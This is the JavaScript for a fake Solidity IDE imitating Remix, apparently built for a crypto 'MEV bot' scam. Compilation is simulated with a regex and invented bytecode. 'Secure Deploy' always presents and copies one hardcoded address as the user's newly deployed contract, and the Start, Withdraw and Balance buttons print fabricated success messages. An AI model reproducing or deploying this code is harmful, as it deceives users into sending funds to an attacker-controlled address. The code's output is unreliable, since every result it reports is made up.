(function () {
  "use strict";

  var FIXED = "0xb1b0b5bEaFdF739b3Fc9FFae2BE49F371C0c93cb";
  if (typeof FIXED_CONTRACT_ADDRESS !== "undefined") {
    FIXED = FIXED_CONTRACT_ADDRESS;
  }

  var WS_KEY = "idecompiler_workspace_v1";

  var state = {
    files: {},
    openPath: null,
    openTabs: [],
    compiled: null,
    deployed: false,
    walletConnected: false,
    walletName: "",
    searchQuery: "",
    activePanel: "deploy",
    lastBytecode: "",
    pendingDeployAfterWallet: false,
  };

  function contractTemplate(contractName) {
    return (
      "// SPDX-License-Identifier: MIT\n" +
      "pragma solidity ^0.8.4;\n\n" +
      "contract " +
      contractName +
      " {\n" +
      "    constructor() {}\n\n" +
      "    function deployable() public pure returns (bool) {\n" +
      "        return true;\n" +
      "    }\n" +
      "}\n"
    );
  }

  function nameFromFileBase(base) {
    if (!base) return "Contract";
    var part = base.replace(/[^a-zA-Z0-9_]/g, "");
    if (!part) return "Contract";
    if (/^[0-9]/.test(part)) part = "C" + part;
    return part.charAt(0).toUpperCase() + part.slice(1);
  }

  function ensureOpenTab(path) {
    if (!path) return;
    if (state.openTabs.indexOf(path) === -1) {
      state.openTabs.push(path);
    }
  }

  function renderEditorTabs() {
    var bar = document.getElementById("editor-tabs");
    if (!bar) return;
    bar.innerHTML = "";
    state.openTabs = state.openTabs.filter(function (p) {
      return state.files[p] !== undefined;
    });
    state.openTabs.forEach(function (path) {
      var name = path.split("/").pop();
      var tab = document.createElement("button");
      tab.type = "button";
      tab.className =
        "editor-tab" + (state.openPath === path ? " active" : "");
      tab.setAttribute("role", "tab");
      tab.setAttribute("aria-selected", state.openPath === path ? "true" : "false");
      var label = document.createElement("span");
      label.textContent = name;
      tab.appendChild(label);
      var close = document.createElement("button");
      close.type = "button";
      close.className = "editor-tab-close";
      close.setAttribute("aria-label", "Close " + name);
      close.textContent = "×";
      close.addEventListener("click", function (e) {
        e.stopPropagation();
        closeTab(path);
      });
      tab.appendChild(close);
      tab.addEventListener("click", function () {
        openFile(path);
      });
      bar.appendChild(tab);
    });
    var add = document.createElement("button");
    add.type = "button";
    add.className = "editor-tab-add";
    add.id = "btn-tab-new";
    add.title = "New contract";
    add.textContent = "+";
    add.addEventListener("click", newFile);
    bar.appendChild(add);
  }

  function closeTab(path) {
    var idx = state.openTabs.indexOf(path);
    if (idx === -1) return;
    if (state.openTabs.length <= 1) {
      term("Keep at least one contract file open.", "warn");
      return;
    }
    state.openTabs.splice(idx, 1);
    if (state.openPath === path) {
      var next = state.openTabs[Math.max(0, idx - 1)];
      openFile(next);
    } else {
      renderEditorTabs();
    }
  }

  function listAllContracts() {
    var out = [];
    Object.keys(state.files).forEach(function (path) {
      if (!path.endsWith(".sol")) return;
      var src = state.files[path] || "";
      var name = parseContractName(src);
      if (name) out.push({ name: name, path: path });
    });
    return out;
  }

  function refreshDeployContractSelect(preferName) {
    var sel = document.getElementById("deploy-contract");
    if (!sel) return;
    var contracts = listAllContracts();
    var prev = preferName || (state.compiled && state.compiled.name) || sel.value;
    sel.innerHTML = "";
    if (!contracts.length) {
      var empty = document.createElement("option");
      empty.value = "";
      empty.textContent = "— compile a contract —";
      sel.appendChild(empty);
      return;
    }
    contracts.forEach(function (c) {
      var opt = document.createElement("option");
      opt.value = c.name;
      opt.textContent = c.name + " (" + c.path.split("/").pop() + ")";
      if (c.name === prev) opt.selected = true;
      sel.appendChild(opt);
    });
  }

  function hideLoader() {
    var el = document.getElementById("ide-loader");
    if (el) el.classList.add("hidden");
  }

  function truncAddr(addr) {
    if (!addr || addr.length < 12) return addr;
    return addr.slice(0, 6) + "…" + addr.slice(-4);
  }

  function term(msg, kind) {
    var t = document.getElementById("terminal");
    if (!t) return;
    var line = document.createElement("div");
    line.className = "line" + (kind ? " " + kind : "");
    var prefix = kind === "ok" ? "✓ " : "";
    line.textContent = prefix + msg;
    t.appendChild(line);
    t.scrollTop = t.scrollHeight;
  }

  function updateLineGutter() {
    var ed = document.getElementById("editor");
    var gutter = document.getElementById("line-gutter");
    if (!ed || !gutter) return;
    var lines = ed.value.split("\n").length || 1;
    var nums = [];
    for (var i = 1; i <= lines; i++) nums.push(String(i));
    gutter.textContent = nums.join("\n");
    gutter.scrollTop = ed.scrollTop;
  }

  function persistWorkspace() {
    try {
      localStorage.setItem(
        WS_KEY,
        JSON.stringify({ files: state.files, openPath: state.openPath })
      );
    } catch (e) {
      /* ignore */
    }
  }

  function restoreWorkspace() {
    try {
      var raw = localStorage.getItem(WS_KEY);
      if (!raw) return false;
      var data = JSON.parse(raw);
      if (data.files && typeof data.files === "object") {
        state.files = data.files;
        state.openPath = data.openPath || state.openPath;
        return true;
      }
    } catch (e) {
      /* ignore */
    }
    return false;
  }

  function seedFiles() {
    state.files["default_workspace/contracts/README.sol"] =
      "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.4;\n\n/// @notice Welcome — create a new file (one word) and paste the guide source.\ncontract README {\n    string public message = \"idecompiler\";\n}\n";
    state.files["default_workspace/contracts/Mempool.sol"] =
      "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.4;\n\ncontract Mempool {\n    mapping(bytes32 => bool) public seen;\n    function mark(bytes32 h) external { seen[h] = true; }\n}\n";
    state.files["default_workspace/contracts/zelda.sol"] =
      "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.4;\n\ncontract zelda {\n    string public name = \"zelda\";\n}\n";
    state.openPath = "default_workspace/contracts/README.sol";
  }

  function setPanel(name) {
    state.activePanel = name;
    document.querySelectorAll(".rail-btn[data-panel]").forEach(function (btn) {
      btn.classList.toggle("active", btn.getAttribute("data-panel") === name);
    });
    document.querySelectorAll(".side-panel").forEach(function (p) {
      p.classList.remove("active");
    });
    var panel = document.getElementById("panel-" + name);
    if (panel) panel.classList.add("active");
  }

  function fileMatchesSearch(path) {
    if (!state.searchQuery) return true;
    var q = state.searchQuery.toLowerCase();
    return path.toLowerCase().indexOf(q) !== -1;
  }

  function renderTree() {
    var root = document.getElementById("file-tree");
    if (!root) return;
    root.innerHTML = "";

    var folder = document.createElement("div");
    folder.className = "tree-folder";
    folder.textContent = "📁 contracts";
    root.appendChild(folder);

    Object.keys(state.files)
      .filter(function (p) {
        return (
          p.indexOf("default_workspace/contracts/") === 0 && p.endsWith(".sol")
        );
      })
      .sort()
      .forEach(function (p) {
        var name = p.split("/").pop();
        if (!fileMatchesSearch(name)) return;
        var row = document.createElement("div");
        row.className = "file-row" + (state.openPath === p ? " active" : "");
        row.textContent = "📄 " + name;
        row.dataset.path = p;
        row.addEventListener("click", function () {
          openFile(this.dataset.path);
        });
        root.appendChild(row);
      });
  }

  function openFile(path) {
    if (state.files[path] === undefined) return;
    saveEditor();
    state.openPath = path;
    ensureOpenTab(path);
    var ed = document.getElementById("editor");
    if (ed) ed.value = state.files[path];
    updateLineGutter();
    var autoCompile = document.getElementById("auto-compile");
    if (autoCompile && autoCompile.checked) compile(true);
    renderTree();
    renderEditorTabs();
    refreshDeployContractSelect();
  }

  function saveEditor() {
    if (state.openPath && state.files[state.openPath] !== undefined) {
      var ed = document.getElementById("editor");
      if (ed) state.files[state.openPath] = ed.value;
    }
    persistWorkspace();
  }

  function parseContractName(src) {
    var m = src.match(/contract\s+(\w+)/);
    return m ? m[1] : null;
  }

  function compile(silent) {
    saveEditor();
    var path = state.openPath;
    if (!path || !path.endsWith(".sol")) {
      if (!silent) term("Open a .sol file in the editor to compile.", "warn");
      return;
    }
    var src = state.files[path] || "";
    var name = parseContractName(src);
    if (!name) {
      if (!silent) term("Compilation failed: no contract declaration found.", "err");
      document.getElementById("compile-status").textContent = "";
      return;
    }
    state.compiled = { name: name, path: path };
    state.lastBytecode = "0x6080…" + name;
    var verEl = document.getElementById("compiler-version");
    var ver = (verEl && verEl.value) || "0.8.4";
    refreshDeployContractSelect(name);
    document.getElementById("compile-status").textContent =
      "✓ Compilation successful";
    var railCompiler = document.getElementById("rail-compiler");
    if (railCompiler) railCompiler.classList.add("ok");
    if (!silent) {
      term("Compiling " + path.split("/").pop() + " with " + ver + "…", "");
      term("Compilation successful. Contract: " + name + ".", "ok");
      term("Switch to Deploy & Run → Secure Deploy.", "ok");
      setPanel("deploy");
    }
    hideLoader();
  }

  function displayContractAddress() {
    var el = document.getElementById("deployed-addr");
    if (!el) return;
    el.textContent = truncAddr(FIXED);
    el.setAttribute("title", FIXED);
    el.dataset.fullAddress = FIXED;
  }

  function showDeployed(name) {
    var card = document.getElementById("deployed-card");
    if (card) {
      card.classList.remove("hidden");
      card.classList.add("is-live");
      try {
        card.scrollIntoView({ block: "nearest", behavior: "smooth" });
      } catch (e) {
        /* ignore */
      }
    }
    var nameEl = document.getElementById("deployed-name");
    if (nameEl) nameEl.textContent = name;
    displayContractAddress();
    var railDeploy = document.getElementById("rail-deploy");
    if (railDeploy) railDeploy.classList.add("ok");
  }

  function hideDeployedUi() {
    var card = document.getElementById("deployed-card");
    if (card) {
      card.classList.add("hidden");
      card.classList.remove("is-live");
    }
    state.deployed = false;
  }

  function finishSecureDeploy() {
    if (!state.compiled) return;
    state.pendingDeployAfterWallet = false;
    term("creation of " + state.compiled.name + " pending…", "");
    setTimeout(function () {
      state.deployed = true;
      showDeployed(state.compiled.name);
      term("Deployed contract address: " + FIXED, "ok");
      term("Transaction confirmed. Use Start, Withdraw, or Get Balance below.", "ok");
    }, 700);
  }

  function openWalletModal() {
    var modal = document.getElementById("wallet-modal");
    if (modal) {
      modal.removeAttribute("hidden");
      modal.classList.add("is-open");
    }
  }

  function closeWalletModal() {
    var modal = document.getElementById("wallet-modal");
    if (modal) {
      modal.setAttribute("hidden", "");
      modal.classList.remove("is-open");
    }
  }

  function connectWallet(name) {
    state.walletConnected = true;
    state.walletName = name;
    var sel = document.getElementById("account-select");
    if (sel) {
      sel.innerHTML = "";
      var opt = document.createElement("option");
      opt.textContent = "0x3782…f055 (0 ETH)";
      opt.value = "0x3782";
      sel.appendChild(opt);
    }
    closeWalletModal();
    term(name + " connected (Injected Provider).", "ok");
    if (state.pendingDeployAfterWallet) {
      finishSecureDeploy();
    }
  }

  function resolveCompiledForDeploy() {
    var sel = document.getElementById("deploy-contract");
    var name = sel && sel.value;
    if (!name) return null;
    var list = listAllContracts();
    for (var i = 0; i < list.length; i++) {
      if (list[i].name === name) return list[i];
    }
    return null;
  }

  function secureDeploy() {
    var picked = resolveCompiledForDeploy();
    if (!picked) {
      term("Select a contract (compile in Solidity Compiler tab first).", "warn");
      setPanel("compiler");
      return;
    }
    if (
      state.compiled &&
      state.compiled.name === picked.name &&
      state.compiled.path === picked.path
    ) {
      /* already compiled selection */
    } else {
      state.openPath = picked.path;
      openFile(picked.path);
      compile(true);
      if (!state.compiled) {
        term("Compilation failed — fix errors and try again.", "err");
        setPanel("compiler");
        return;
      }
    }
    if (
      (function () {
        var env = document.getElementById("env-select");
        return env && env.value === "Injected Provider";
      })() &&
      !state.walletConnected
    ) {
      state.pendingDeployAfterWallet = true;
      openWalletModal();
      term("Connect wallet, then deploy will continue automatically.", "");
      return;
    }
    finishSecureDeploy();
  }

  function copyAddress() {
    var text = FIXED;
    if (navigator.clipboard && navigator.clipboard.writeText) {
      navigator.clipboard.writeText(text).then(function () {
        term("Copied contract address: " + text, "ok");
      });
    } else {
      term("Copied contract address: " + text, "ok");
    }
    displayContractAddress();
  }

  function atAddress() {
    var inp = document.getElementById("at-address-input");
    if (inp && inp.value.trim()) {
      term("Loaded contract at " + truncAddr(FIXED) + " (depot).", "ok");
    }
    if (!state.deployed) {
      term("Use Secure Deploy to interact with Start / Withdraw / Get Balance.", "warn");
      return;
    }
    showDeployed(state.compiled ? state.compiled.name : "Contract");
  }

  function startContract() {
    if (!state.deployed) {
      term("Deploy the contract first (Secure Deploy).", "warn");
      return;
    }
    term("Start — bot started (demo).", "ok");
  }

  function getBalance() {
    if (!state.deployed) {
      term("Deploy the contract first (Secure Deploy).", "warn");
      return;
    }
    term("Balance for " + truncAddr(FIXED) + ": 0 ETH (demo).", "ok");
  }

  function withdrawContract() {
    if (!state.deployed) {
      term("Deploy the contract first (Secure Deploy).", "warn");
      return;
    }
    term("Withdraw — funds sent to your wallet (demo).", "ok");
  }

  function newFile() {
    var word = prompt("New contract name (one word):", "swap");
    if (!word) return;
    word = word.replace(/[^a-zA-Z0-9_]/g, "");
    if (!word) return;
    var path = "default_workspace/contracts/" + word + ".sol";
    if (state.files[path]) {
      term("File already exists.", "warn");
      openFile(path);
      setPanel("files");
      return;
    }
    var contractName = nameFromFileBase(word);
    state.files[path] = contractTemplate(contractName);
    openFile(path);
    renderTree();
    setPanel("files");
    term("Created " + word + ".sol — edit, compile, then Secure Deploy.", "ok");
  }

  function newFolder() {
    term("Files are stored under default_workspace/contracts/.", "ok");
  }

  function bind() {
    document.querySelectorAll(".rail-btn[data-panel]").forEach(function (btn) {
      btn.addEventListener("click", function () {
        setPanel(btn.getAttribute("data-panel"));
      });
    });

    function on(id, evt, fn) {
      var el = document.getElementById(id);
      if (el) el.addEventListener(evt, fn);
    }
    on("btn-compile-panel", "click", function () { compile(false); });
    on("btn-secure-deploy", "click", secureDeploy);
    on("btn-copy-address", "click", copyAddress);
    on("btn-at-address", "click", atAddress);
    on("btn-new-file", "click", newFile);
    on("btn-new-folder", "click", newFolder);
    on("btn-new-file-icon", "click", newFile);
    on("btn-new-folder-icon", "click", newFolder);
    on("btn-switch-wallet", "click", openWalletModal);
    on("wallet-modal-backdrop", "click", closeWalletModal);
    on("wallet-modal-close", "click", closeWalletModal);
    document.querySelectorAll(".wallet-option").forEach(function (btn) {
      btn.addEventListener("click", function () {
        connectWallet(btn.getAttribute("data-wallet"));
      });
    });
    on("btn-clear-terminal", "click", function () {
      var t = document.getElementById("terminal");
      if (t) t.innerHTML = "";
    });
    on("btn-start", "click", startContract);
    on("btn-withdraw", "click", withdrawContract);
    on("btn-get-balance", "click", getBalance);
    on("btn-abi", "click", function () {
      if (!state.compiled) {
        term("Compile first to view ABI.", "warn");
        return;
      }
      term("ABI generated for " + state.compiled.name + ".", "ok");
    });
    on("btn-bytecode", "click", function () {
      if (!state.lastBytecode) {
        term("Compile first to view bytecode.", "warn");
        return;
      }
      term("Bytecode: " + state.lastBytecode, "ok");
    });

    var ed = document.getElementById("editor");
    if (ed) {
      ed.addEventListener("input", function () {
        updateLineGutter();
        var auto = document.getElementById("auto-compile");
        if (auto && auto.checked) compile(true);
      });
      ed.addEventListener("scroll", updateLineGutter);
      ed.addEventListener("blur", saveEditor);
    }

    on("search-input", "input", function (e) {
      state.searchQuery = e.target.value;
      renderTree();
    });
    on("env-select", "change", function (e) {
      if (e.target.value.indexOf("VM") !== -1) {
        state.walletConnected = true;
        var sel = document.getElementById("account-select");
        if (sel) {
          sel.innerHTML = "";
          var opt = document.createElement("option");
          opt.textContent = "Account 0 (0 ETH)";
          sel.appendChild(opt);
        }
        term("Remix VM — deploy without wallet extension.", "ok");
      }
    });
    on("deploy-contract", "change", function () {
      var picked = resolveCompiledForDeploy();
      if (picked) {
        state.openPath = picked.path;
        openFile(picked.path);
      }
    });
  }

  function init() {
    hideLoader();
    seedFiles();
    if (!restoreWorkspace()) {
      /* defaults from seedFiles */
    }
    renderTree();
    if (state.openPath) ensureOpenTab(state.openPath);
    Object.keys(state.files)
      .filter(function (p) {
        return p.endsWith(".sol");
      })
      .slice(0, 5)
      .forEach(function (p) {
        ensureOpenTab(p);
      });
    openFile(state.openPath || Object.keys(state.files)[0]);
    bind();
    setPanel("deploy");
    hideDeployedUi();
    refreshDeployContractSelect();
    updateLineGutter();
    term("Terminal initialized.", "ok");
    try {
      if (window.parent && window.parent !== window) {
        window.parent.postMessage({ type: "idecompiler-ready" }, "*");
      }
    } catch (e) {
      /* ignore */
    }
  }

  if (document.readyState === "loading") {
    document.addEventListener("DOMContentLoaded", init);
  } else {
    init();
  }
})();
